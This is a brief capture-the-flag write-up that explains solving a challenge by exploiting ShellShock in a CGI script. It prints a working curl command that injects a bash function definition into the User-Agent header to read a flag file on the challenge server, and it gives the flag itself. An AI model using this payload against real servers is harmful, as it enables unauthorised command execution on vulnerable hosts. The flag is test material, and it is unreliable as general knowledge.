# RSA
**Category:** Medium
**Points:** 400
**Solves:** 23
**Description:**

>We have been given access to a script snippet that is vurlnerable. Can you exploit it and find the flag?
>
>Flag is in format: CT##-####-#####-####
>
>You can access the site from [here](http://ctfp.ee:11111/unsafe.cgi)

# Write-up
by BubblyPen

In this challange you have to get the flag via ShellShock.

Searching for *bash cgi vulns*, you can find a lot of ShellShock exploits. I found [this](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock) link very useful.

By using this 
```bash
curl -H "User-agent: () { :;}; echo; /bin/cat ../j*" http://ctfp.ee:11111/unsafe.cgi
```

***Flag:*** CT20-Sh3l-lSh0c-k3d!